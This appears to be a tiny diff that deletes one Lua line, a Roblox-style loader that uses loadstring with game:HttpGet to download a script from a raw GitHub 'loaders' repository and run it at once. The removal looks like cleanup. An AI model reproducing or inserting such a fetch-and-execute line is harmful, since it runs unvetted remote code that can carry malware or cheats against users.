@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/update-x-cvr-retro-spam5-j6qat9yqocwko6.lua"))()
